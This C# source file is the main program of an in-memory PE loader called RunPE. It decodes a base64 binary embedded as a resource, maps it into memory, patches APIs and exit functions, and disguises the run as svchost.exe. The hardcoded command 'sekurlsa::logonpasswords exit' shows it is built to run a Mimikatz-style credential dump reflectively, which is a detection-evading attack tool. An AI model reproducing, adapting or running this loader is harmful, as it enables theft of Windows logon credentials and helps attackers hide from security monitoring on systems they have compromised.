using System;
using System.IO;
using System.Text;
using RunPE.Internals;
using RunPE.Patchers;
using System.Reflection;
using System.Linq;

namespace RunPE
{
    public class Program
    {
        private const uint EXECUTION_TIMEOUT = 30000;

        internal static Encoding encoding;

        public static int Main(string[] args)
        {
            try
            {
                string[] command = new string[] { "sekurlsa::logonpasswords exit" };
                // Replace or adjust this part to read from resources
                var peRunDetails = GetPeRunDetailsFromResources(command);

                var argumentHandler = new ArgumentHandler();

                if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.arguments))
                {
                    return -3;
                }

                var peMapper = new PEMapper();
                peMapper.MapPEIntoMemory(peRunDetails.binaryBytes, out var pe, out var currentBase);

                var importResolver = new ImportResolver();
                importResolver.ResolveImports(pe, currentBase);

                peMapper.SetPagePermissions();


                var fileDescriptorRedirector = new FileDescriptorRedirector();
                if (!fileDescriptorRedirector.RedirectFileDescriptors())
                {
                    Console.WriteLine("[-] Unable to redirect file descriptors");
                    return -7;
                }

                var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
                extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();

                // Patch this last as may interfere with other activity
                var extraAPIPatcher = new ExtraAPIPatcher();

                if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
                {
                    return -9;
                }

                var exitPatcher = new ExitPatcher();
                if (!exitPatcher.PatchExit())
                {
                    return -8;
                }

                fileDescriptorRedirector.StartReadFromPipe();

                StartExecution(peRunDetails.arguments, pe, currentBase);

                // Revert changes
                exitPatcher.ResetExitFunctions();
                extraAPIPatcher.RevertAPIs();
                extraEnvironmentalPatcher.RevertExtraPatches();
                fileDescriptorRedirector.ResetFileDescriptors();
                argumentHandler.ResetArgs();
                peMapper.ClearPE();
                importResolver.ResetImports();

                // Print the output
                var output = fileDescriptorRedirector.ReadDescriptorOutput();


                Console.WriteLine(output);

                return 0;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running RunPE: {e}");
                return -6;
            }
        }

        private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
        {

            try
            {
                var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
                var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);

                NativeDeclarations.WaitForSingleObject(hThread, EXECUTION_TIMEOUT);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error {e}\n");
            }

        }
        private static void PrintUsage()
        {
            Console.WriteLine("Usage: RunPE.exe <args-to-file-to-run>");
            Console.WriteLine("\te.g., RunPE.exe sekurlsa::logonpasswords");
        }

        private static PeRunDetails GetPeRunDetailsFromResources(string[] command)
        {
            string filename = ReadResourceText("file.txt");
            byte[] binaryBytes = Convert.FromBase64String(filename); // Assuming file.txt contains base64 encoded binary
            string impersonation = "C:\\Windows\\System32\\svchost.exe";

            return new PeRunDetails { filename = impersonation, arguments = command, binaryBytes = binaryBytes };
        }

        private static string ReadResourceText(string resourceName)
        {
            // Get the current assembly through which this code is executed
            var assembly = Assembly.GetExecutingAssembly();

            // Find the resource name that ends with the specified file name, ignoring case
            var fullResourceName = assembly.GetManifestResourceNames()
                .FirstOrDefault(name => name.EndsWith(resourceName, StringComparison.OrdinalIgnoreCase));

            if (string.IsNullOrEmpty(fullResourceName))
            {
                Console.WriteLine($"[-] Unable to find embedded resource: {resourceName}");
                return null;
            }

            // Read the content of the resource
            using (Stream stream = assembly.GetManifestResourceStream(fullResourceName))
            {
                if (stream == null) return null;
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
        }

    }

    internal class PeRunDetails
    {
        internal string filename;
        internal string[] arguments;
        internal byte[] binaryBytes;
    }

}
